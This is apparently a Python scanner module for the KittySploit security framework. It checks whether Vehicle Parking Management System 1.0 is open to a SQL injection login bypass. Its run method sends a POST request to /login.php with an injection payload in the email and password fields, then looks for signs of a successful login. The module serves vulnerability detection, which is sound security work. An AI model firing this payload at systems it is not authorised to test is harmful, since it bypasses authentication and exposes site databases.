#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vehicle Parking Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vehicle Parking Management System 1.0 - SQL Injection Detection',
        'description': 'Vehicle Parking Management System 1.0 contains a SQL injection vulnerability via the password parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'auth-bypass', 'edb', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/48877'],
    }

    def run(self):
        path = '/login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{{BaseURL}}/login.php', 'Cookie': 'PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8'}, data='email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('LAGOS PARKER', 'Login Successfully', "location.href = 'index.php';",)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Vehicle Parking Management System 1.0 - SQL Injection detected', path=path)
            return True
        return False

